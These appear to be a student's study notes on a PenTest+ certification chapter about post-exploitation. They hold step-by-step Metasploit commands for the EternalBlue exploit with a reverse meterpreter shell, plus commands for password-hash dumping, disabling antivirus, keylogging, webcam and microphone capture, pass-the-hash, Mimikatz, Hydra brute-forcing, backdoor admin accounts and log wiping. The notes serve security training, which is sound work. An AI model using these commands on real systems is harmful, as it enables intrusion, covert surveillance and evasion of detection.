# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition

# Chapter 8: Understanding Post Exploitation Actions

Actions after bypassing security of system:
- Gaining Access to passwords that can access to other systems on network
- Planting backdoor so if system is patched, there will still be a way into system later on.

Learn:
- Common post exploitation tasks
- Obtain shell
- Retrieve password hashes
- Disable Antivirus software
- Take Screenshots
- Take remote control of the system on network
- How to maintain access (persistence).
- How to cover your tracks when finished.

#

## Common Post Exploitation Tasks

Common Post Exploitation Tasks
- Meterpreter session in Metasploit.
- Meterprete = Metaspolit payload (type of attack) that gives you interactive command prompt
  - Containing number of built in modules (commands) for execution on target system aiding in post exploitation.
 
Vuln in SMB protocol (EternalBlue)
- `msfconsole`: open up metasploit.
- `search ms17-010`: search EternalBlue in metasploit.

![image](https://github.com/user-attachments/assets/2e8f233e-d32d-436e-8de8-480656f6692f)

- `use exploit/windows/smb/ms17_010_eternalblue`
-  `set payload windows/x64/meterpreter/reverse_tcp`
-  `set RHOST <victim_ip>`
-  `set LHOST <kali_ip>`
-  `exploit`

![image](https://github.com/user-attachments/assets/43304077-f3ae-4db3-9bc0-325284193214)

- Once system has been exploited you will see meterpreter prompt.

Commands broken down by category:
- Core Commands: Standard commands available with meterpreter; allow to perform number of tacks: background the current session, exit, get help, and migrate.
- File System Commands: Allow you to work with folders and files (Example: dir, cat, upload, and edit).
- Network Commands: Give details on your network setup and environment. Commands includes `ifconfig`. `ipconfig`, `netstat`, `route`.
- System Commands: Works with target system. Example: Can view running processes with `ps` or kill a process with `kill` command.
- User-interface commands: Works with user interface environment with command such as `keyscan_start`, `screenshot` and `idletime`.
- Webcam Commands: manipulate webcam of compromised system by turning it on or off. Can use command such as `webcam_list`, `record_mic`, `webcam_snap` or `webcam_stream`.
- Elevate Commands: `getsystem` command elevates your privileges to system-level privileges.
- Password Database Commands: Can retrieve list of password hashes from system by using the `hashdump` command.
- Timestomp Commands: Can manipulate file MACE (modifies, access, created, entry) attributes with `timestomp` command.


Understanding the Context
- Important commands: `sysinfo`, `getuid` `getpid` `pwd`
- `sysinfo`: display system information; computer you are currently on and its OS information.
- `getuid`: display user account you are connected as.
- `getpid`: display process you are connected to as your running context.
- `pwd`: display current directory you are in on victim's system.

![image](https://github.com/user-attachments/assets/817d6491-bf46-4a91-917d-c3f6ceeb9166)


Collecting Information/ Enumeration
- Users: Retrieving list of usernames from system could aid in gaining access to restricted areas on system or access to othe systems.
- Groups: Getting list of groups can help you determine if you need to add yourself to specific group in order to bypass access crontrol lists at later time.
- Forests: Getting a list of Active Directory forests that exist can be helpful to locate other resources on network.
- Sensitive Data: User account information or company sensitive data.
- Unencrypted files: Look thru unencrypted files to find info of value.


Commands:
- `run checkvm`: check to see if system is a VM and platform its using.
- `run winenum`: run a script to enumerate entire system and find info such as IP settings, ither systems on network in the same domain arp cache of system, user acc on system.
  - Output is saved: `/root/.msf4/logs/scripts` folder.

![image](https://github.com/user-attachments/assets/35e7189c-a704-4b0f-8ec5-9dceecf8f6df)

![image](https://github.com/user-attachments/assets/9c2e7044-8958-402f-9d35-16d64d8f1c97)

- `run scraper`: Another enumeration tool that does the same thing and store the results into log files.


Obtaining Shell
- First thing to do after exploiting a system is: get Command prompt shell of that system so anything can be use on OS  I want to use.
- `shell`, get a command prompt of exploited system.
- After running `shell`, you will have the command prompt of target system available.
- When you are finished execturing OS commands, use `exit` command to go back to meterpreter prompt.

![image](https://github.com/user-attachments/assets/fa31b109-305a-494f-95b4-a89af6fe5fc9)


Retrieving Password Hashes
- `hashdump`: to retrieve password hashes of user accounts that exist on victim's system.
- After retrieving hash values, you can use those in the pass-the-hash type of attack
- Can also use password crackers and try to crack the password.

![image](https://github.com/user-attachments/assets/02890fd2-ec65-4f4a-89fa-0815b6787cea)

Disabling the Antivirus Software
- You can plant virus as a backdoor to the system by disabling antivirus.
- `run killav`: run this on meterpreter to disable antivirus software.


Migrating to Different Process
- Jumping from current process you exploited to another process that is more stable; explorer.exe or Other OS process thats running at all times.
- First command to run in this scenerio is `getpid`, in order to view the current process.
- `ps`: See the list of processes running on victim's system.
- `mirgate <desired_process_id>`: command tries to switch to another process.

![image](https://github.com/user-attachments/assets/cb31dc7e-a3b2-4c93-9f31-785f2e3289e0)


Privilege Escalation and Restrictive Shells
- Privilege Escalation: when attacker exploit a vuln within system/software on system and gain elevated permission to resources that they won't normally have.
- Two types of Privilege Escalation

![image](https://github.com/user-attachments/assets/5340f917-9111-478a-bd61-08bbfff58e4e)

- Restrictive Shell: Your actions are restricted due to limitation put on the shell environment.
  - After gaining access to a system; you can upgrade a restricted shell to a non-restricted shell.
  - by executing commands to obtain an interactive shell or by exexuting command thru another programming environment supported by system (Python or Ruby).
 

Taking Screenshots
- `screenshot`: command to take screenshot of victim's screen to see what program victim is using.
  - JPEG file saved to /root/directory with random filename
 

Taking Remote Control
- Can watch victim's computer by using Virutal Network Computing (VNC).
- `run vnc`: to establish VNC connection to system at meterpreter prompt.

![image](https://github.com/user-attachments/assets/6be4cd82-d348-4d6d-920a-eaac2aff99b4)


Capturing Keystrokes
- Great way to get logon activity to app and websites is to capture all user's keystrokes.
- Need to migrate to "explorer.exe".
- `ps`: to see what explorer.exe ID (2780)
- `migrate 2780`: to change to explorere process.
- Once migrated; `keycan_start`: to capture keystrokes a user types.
  - Run a bit, can dump the keystokes to your screen with: `keyscan_dump`.
  - `keyscan_stop` to stop recording keystrokes at any time.

![image](https://github.com/user-attachments/assets/92ad5da4-4b13-43b3-bc1f-11b9b47a36e7)


Enabling the Webcam
- `webcam_list`: to get list of webcams on victim's system. Each webcam would have an index number associated with it starting with 1.
- `webcam_snap`: Take photo from one of the webcams, `webcam_snap -i 1`; where 1 is index of webcam 1.
- `webcam_stream`: Activate live video stream, `webcam_stream -i 1`; Meterpreter will launch browser that contain live stream video embedded in webpage.

Enable Microphone/ Record
- `record_mic -d 45`: record the conversation of people sitting at the computer for 45 seconds. .wav files.


Network Segmentation Testing
- Checking different network segments after exploiting a system.
- Test: If you can use Nmap to see if you can communicate from segment to network segment, where communication is supposedly not permitted.
- Test: Communication from Internet into network's demilitarized zone (DMZ) to see if traffic can go from DMZ to private network segment.

#

## Performing Lateral Movement

Lateral Movement
- Once you exploit a system, you use that system to disover and compromise other systems on network.

Example:
- OS A: not been patched with many vuln
- OS B: Newer OS, Up-to-date with patches.

![image](https://github.com/user-attachments/assets/d68a349b-06a8-413b-b637-03c1d9209beb)

- Attacker can exploit vuln on OS A then use post exploitation tasks to discover other info about environment; password from compromised OS.
  - Can use Lateral movement tools to attempt access to that system using password you retrieved from OS A. (System might be config with same password).

![image](https://github.com/user-attachments/assets/0c1addce-6d2f-4616-8abd-1c2c47d5d3ec)


Techniques used to discover systems on Exploited Network:
- View System Information: After exploiting system, should spend time discovering info about the system and network its on by retrieving IP address settings.
  - Getting a list of other systems on the network, shares on system and network and arp cache.
  - `run winenum`: to collect this data quickly.
- DNS Queries: Can query the DNS (Domain Name System) server using tools such as `nslookup` or `dig` to get a list of hostnames and IP addresses.
- Ping Sweeps: After obtaining IP address info, you could perform ping sweep of entire network range to discover what other systems are alive on network.
- Port Scans: After Ping sweep, you could do a port scan on live system to see what service are running and ports are open.


### PS remoting/WinRM

PS remoting/WinRM
- Window Remote Management (WinRM) Service = Feature of Windows that allows Admin to manage a Window System remotely using
  - HTTP Over port 5985 and HTTPS over port 5986.
  - Must have admin credentials in order to connect to this service and perform remote admin.

Use WinRM to perform Lateral Movement
- First need to know which system are running WinRM on target network.
- Can perform a simple Nmap scan to deteremine which system have the port open
  -   `nmap -p 5985,5986 -sS 192.168.2.0/24`
- After discovering the system on target network running WinRM, can run commands on those systems using PowerShell `invoke-command` cmdlet and admin credentials you cracked.
  - `Invoke-command -computername 192.168.2.10 -ScriptBlock {dir c:\}`
- Can use any Window command in curly brackets to execute that command on remote system.
- If you install Mimikatz on compromised system and downloaded `invoke-mimikatz.ps1` script, you can use Mimikatz PowerShell script to get password from memory of remote system:
  - `Import-module ./invoke-mimikatz.ps1`
  - `Invoke-mimikatz -computername 192.168.2.10`
- If you obtained passwords from other account, you can try to use those passwords to connect to other system on network.


### Using PsExec

PSTools Suite
- Microsoft tools, created by Sysinternals folks.
- Can view the process info of running processes on system, run commands on a remote system.
- One of the toos in PSTools is PSExec.
  - Common command line tool that allow you to run commands (processes) on remote system.
 

Once Exploited, Gained access to One of systems on network:
- First should verify you have admin access, because PSTools suite requires person executing tool to have admin access.
- If you have exploited service on system, typically running in context of system account; Admin level access.
  - Can verify by: `whoami`
- Run `psexec \\newserver -u administrator -p Pa$$w0rd cmd.exe` on remote system.
  - This command supply the computer name of the system you wish to connect to, the credentials to make connection, and the command to run (cmd.exe to get command prompt).
  - Note: username and password you are trying are username/password obtained from Mimikatz.
  - Hoping admin are using the same password on each system for admin account.
 

### Using PSExec with pass the hash

PSExec with Pass the Hash
- After exploiting first system, retrieve list of password hashes from system.
- Use that hash instead of plain-text password to authenticate to target system for lateral movement.
- Benefit: Do not have to crack password, you simply authenticate with hashed version of password.

Example: 

1. Exploit initial target with exploit we detemined may work on system due to reconnaissance on the netapi exploit.
![image](https://github.com/user-attachments/assets/7eaec148-55a0-49c5-be07-235292e88fbe)

2. If exploit is successful, you should be at meterpreter prompt.
- Use `sysinfo` to verify the system you are on, and then grab password hash with `hashdump`.

![image](https://github.com/user-attachments/assets/453ec28d-6a49-4a8e-89dc-0153d690d02a)

3. Copy and paste the username and hash values to a text file.
- locate other Windows Systems on the network to try to use the password hashes on the pass the hash  scenario.
- Can use `nmap` with OS dectection command `-O`
- `nmap -sS -p 135,139,445 -O 192.168.1.0/24`

4. Output of the Nmap Command, look at OS details of each system to determine if its Windows System.
- Note: IP address of those system, start a Metasploit session again
- Try the following command on each systems and replace the RHOST setting with one of IP address that are Window Systems:

![image](https://github.com/user-attachments/assets/cba63ff6-bea0-46b8-bb54-9c6513d2a836)

5. Use `show options` command to see list of options that need to be set.

![image](https://github.com/user-attachments/assets/8dc6045c-305f-4fa6-8e75-beb80d9de730)

6. Set options, enter the following:

![image](https://github.com/user-attachments/assets/d0257e02-f667-4386-a6be-9be4494c16ea)

7. If you are able to connect, it tell you on screen that the authentication was successful.
- If not able to connect, then username and same password does not exist on target system.
- Try one of the other entries from hashdump.


### Using RDP

RDP
- Remote Desktop Protocol
- Used to remotely connect to Windows system and log on interactively as if you were next to the machine.

Using Nmap to see if RDP is enable
- `nmap -p 3389 -sS 192.168.2.0/24`

After identifed remote desktop is installed
- Can connect to those sytem using remote desktop client.
  - run `mstc` command and log on with admin account and password you cracked.
- Use password cracker to try a dictionary attack on password using Hydra:
  - `hydra -t 3 -V -f -l administrator -P rockyou.txt rdp://192.168.2.10`

![image](https://github.com/user-attachments/assets/c8960004-7cad-4f83-912d-5f748ef94982)


### Using RPC/DCOM

RPC/DCOM
- Protocol Used to Allow communication are Remote Procedure Call (RPC) and Distributed Component Object Model (DCOM).
- RPC = underlining protocol used by Windows to allow communication between processes including processes running on different systems.
- DCOM = Tech that uses RPC for communication and allow software to invoke calls to other systems on network.

Key Point:
- Both RPC DCOM are tech designed to make remote calls to a system
- Any vuln that exist may allow hacker to run code on remote system.


### Using Remote Services

Routers, Switches, Printers, Servers are configurated for Remote Access Protocol for:
- Telnet
- SSH
- VNC
- Attackers can scan for these services once inside network, then try to connect to those systems with obtained cracked password.

Services Used for Lateral Movement:
- Virtual Network Computing (VNC): Popular desktop sharing program, runs on different plaforms and allows admin to remote connect to system and manage it as if admin was next to it. VNC client connects to VNC server software using TCP port 5900 by default.
- X-server Forwarding: Linux feature that allows admin to send the screen of application running on Linux system to remote machine; Windows or Linux machine.
- Telnet: Service that is available on many devices and servers for remote admin purposes. Telnet sends data in clear text, including authentication traffic over TCP port 23.
- Secure Shell (SSH): Provide Secure alternative to telnet, it encrypt all communication between SSH client and SSH service including authentication traffic over TCP port 22.
- RSH/Rlogin: Remote Shell (rsh) and remote login (rlogin) to remote into Linux system and execute shell commands from different computer.

- Benefit: Allows admin to remotely manage system
- Disadv: The system is open up to attackers; attackers can leverage these services running on other system on network for lateral movement.

Steps to discover and connect to system that has Telnet service running:
1. Kali Linux system, exploit the first target system (Windows 7 client)
- `msfconsole`
- `search eternal`

2. Exploit for vuln "ms17_010" known as EternalBlue.
- Use EternalBlue to exploit to gain access to Windows 7 systems:

![image](https://github.com/user-attachments/assets/42a9e75f-e4e8-475e-be32-2c948477cc31)


3. After exploiting system, you should be sitting at Meterpreter prompt and first thing should run `sysinfo`

![image](https://github.com/user-attachments/assets/d5c61ec5-f8d2-43eb-9ee4-492d46a07fd0)


4. After verifying that you are on victim's system and can execute commands, use `ifconfig` to verify the TCP/IP settings of victim.
- Allow you to understand the IP range of victim's network - important for lateral movement.

5. After knowing the IP address of system you exploited, do an `arp` scan of target network to discover other systems that are up and running.
- Use `run arp_scanner -r` to discover live systems on the target network.
- `-r`: how you specify the range to scan.

![image](https://github.com/user-attachments/assets/b7b85161-1dbf-44e4-a57d-6ffe5489b098)

6. Next do a port scan on these systems; No port scanning meterpreter commands.
- To do port scan, we have to jump back to msfconsole to use port scan tools.
- Problem: systems to port scan are in the meterpreter session.

![image](https://github.com/user-attachments/assets/fc9bc2e6-745e-4234-987b-e952bf6d1cfc)

7. To run port scan from msfconsole to system available in meterpreter session, have to add a route from msfconsole to meterpreter session with:

![image](https://github.com/user-attachments/assets/06b335ef-6927-4959-ac56-d11e00b4e2f4)

- Note: the `1` at the end of the `route add` command specifies meterpreter session to add route.
- Use: `route print` command to display routes that have been added.

8. Run port scan; use portscan auxiliary module with Metaploit.
- Use module and set hosts and ports to scan
- Can scan more than one port at a time

![image](https://github.com/user-attachments/assets/84a6ac76-6cdf-4d56-a2a0-9eb7c4ce2623)

9. After getting a list of IP addresses, have the port open that you wish to connect to, then connect to that port using telnet client or Netcat.
- Can telnet into system using telnet command.
- IP address of the target you wish to telnet into.

![image](https://github.com/user-attachments/assets/208d59da-98a7-4185-9363-3daa06def564)

10. After login to telnet, you can manage Windows system as you normally would from a command prompt.
- To view a list of user account, use `net user` command.

![image](https://github.com/user-attachments/assets/533af64c-c079-4012-ac07-4981a9c0ce41)


### Other Techniques for Lateral Movement

Windows Management Instrumentation (WMI)
- A technology that allows you to make remote calls to system and retrieve any info about hardware and software settings of the system.
- Also can be us to call functions of system such as reboot system.
- Example: following command can find out locally logged on user of a computer on the network:

![image](https://github.com/user-attachments/assets/d7fc855a-f0a7-4c46-a860-cba1898b279a)

Scheduled Tasks:
- A way to automatically execute program on system.
- Use a combination of PowerShell and WMI technology to remotely add a scheduled task to target system.
- Example: Following command - connect to a remote system from our victim using PowerShell to register a scheduled task on the system called LateralMovement.
  - task runs `calc.exe` at 3 am:
 
![image](https://github.com/user-attachments/assets/474f7bfa-6ceb-4df3-a049-e6f0d171451b)

Server Message Block (SMB):
- File-sharing protocol in Windows environments
- Can be used to connect to remmote systems for lateral movement.
- Can also be used to connect to file system of a lateral target using a username and password you already cracked.

Apple Remote Desktop:
- Remote Desktop technology to remote into a MAC system.
- Can be used as a method to move laterally to MacOS.

#

## Maintaing Access (Persistence)

Main Reason able to exploit system:
- Admin of systems have not kept up to date with patching systems.
- Once fixed; can't exploit again, so attacker create a backdoor on system as another way to gain access to the system.


New User Creation
- Creating a user account on system that can be used to log on and gain access to system at later time can maintain access.
- Create new user account to be admin on system that can be used to connect to file system or remotely connect via technologies; remote desktop.
- Note: Network admin often audit network and look at the number of admin account exists. Meaning the weaadmin account may be discovered during audit.'

Steps to create a new Admin account: 
1. Need to exploit system using vuln on the system you found using Nessus as Vuln scanner.
- Using EternalBlue exploit again against Windows 7 system.
- Kali Linux, use the following commands to load metasploit and gain meterpreter session on target system:

![image](https://github.com/user-attachments/assets/c4408afd-2909-486d-b8f8-bd1b15e51b86)

2. Once meterpreter session opens, Use `shell` command to gain access to OS command prompt of victim

![image](https://github.com/user-attachments/assets/af4ad900-de86-43cc-8ce2-0db12179ef52)


3. After at the command prompt of target Windows Machine, use the OS commands to create a user account and add the user account to admin group:

![image](https://github.com/user-attachments/assets/63e17d5e-a7e0-42de-ad39-c07b53135fc4)

- Start by using `net user` command to view the list of user accounts on system.
- Help to understand the convention to use so that I can hopefully hide the account in the list of accounts.
  - If account names are  "bsmith", I will create a backdoor account thats "jwhite"
- create user account with `net user` command and specify the account name to be "backdooruser" and password to be "Pa$$w0rd".
- Add the user to local admin group of the system

![image](https://github.com/user-attachments/assets/3c81067e-3d0a-4632-a9fd-9cbdef10aa8c)


### Planting Backdoors and Trojans

Planting  Malicious Software:
- Planting backdoors on systems.
- When backdoor software is run on victim's system, it opens a port on system that you can connect.
- Or it can run on victim's system connects back to attacker's system (reverse connection)
  - Reverse connection is ideal beceause you don't have to worry about opening ports on firewalls on victim's network and system.w
 
- Can create backdoor by using tools; Netcat to create bind shell or reverse shell to the system.
- Can also plant trojan viruses on system, typically open a port on system that you can connect to at a later time.wwww


### Other Techniques for Maintaining Access

Scheduled Jobs:
- Create a scheduled job on victim's system that runs a program to connect back to attacker's system,
- or open a port on victim's system for attacker to get in.

Scheduled Tasks:
- Create a scheduled task on system that launches malicious softeware on system that either open port or makes a connection to attacker's system.

Daemons:
- Install a background service (Windows) or daemon (Linux) that runs all times and designed to open port on system.
- Running service or daemon then wait for connection from attacker who can use service as method to exploit the system.


### Detection Avoidance

Techologies that can be used "living off the land"
- PsExec
- WMI
- WinRM
- PowerShell Remoting


Techniques to Avoid Detection:
- Data exfilration: Use tools to extract relevant data off victim's system for offline viewing.
- Steganography: Hiding data inside other data; hide text file as graphic files.
- Establishing Covert Channel: create a covert channel from compromised system to your attacker computer and copy data back to your attacking system.


#

## Covering Your Tracks

Perform as final step in post-exploitation
- Before you start next phase of reporting and communication.
- Taking steps to ensure that an admin does not notice you have exploited a system.
- Involves deleting entries in audit logs that have recorded your activity.

Techniques:
- Erase thhe log file that may contain entries that tracked your activity.
- Use `clearev` command to erase Window event logs from meterpreter session.
  - Erase: application log, system log, security log.

![image](https://github.com/user-attachments/assets/442d3ddd-535a-45d9-a874-ebb60e3182e8)

- For Linux, logs are stored in `/var/logs`
- Use `truncate` command to clear a log and specify desired size of the log file after trncation has occurred (o to erase all content)
  - `truncate -s 0 logfile`

#

## Reviewing Key Concepts:

» Kali Linux has a meterpreter session that has a number of commands to perform post-exploitation tasks. 

» You can use the run winenum command to collect information about the target network after compromising one of the systems.

» You may need to migrate to another process with the migrate command to perform some post-exploitation tasks. 

» Lateral movement is when you jump from the initial victim system to other systems on the target network.

» After exploiting a system, you can create a backdoor account or run a piece of software to ensure you can gain access to the system at a later time.

» Be sure to hide your tracks by clearing log files that have tracked your activity during the attack.


#

## Prep Test

1. B
2. A x
3. A
4. C x
5. D
6. B, D
7. A
8. B
9. C
10. C


#

## For The Exam

- Empire: PowerShell post-exploitation toolset that is similar in concept to Metaspolit as it has a number of modules to perform different tasks; Keyloggers and Mimikatz.
- Mimikatz: Tool used to see other use accounts on system and obtain their password hashes. Unique; can obtain credentials that are still running in memory.
- Bloodhound: Tool used to view relationship between active directory objects in graphical environment.
  - Example: Can identify how many accounts are domain admin account.
 
- Objectives refer to maintaining persistence as creating a foothold on the system.
- One method of maintaining access is to create a user account on the system to act as a backdoor to the system at a later time. 

- Running daemon or service in background is method of maintaining access. Service can be used as backdoor to gain access to system even after system is patched or exploit no longer works.

- Remember you should always cover your tracks after compromising a system. Involves ensuring evidence of your actions does not exist on system. Erasing log files.
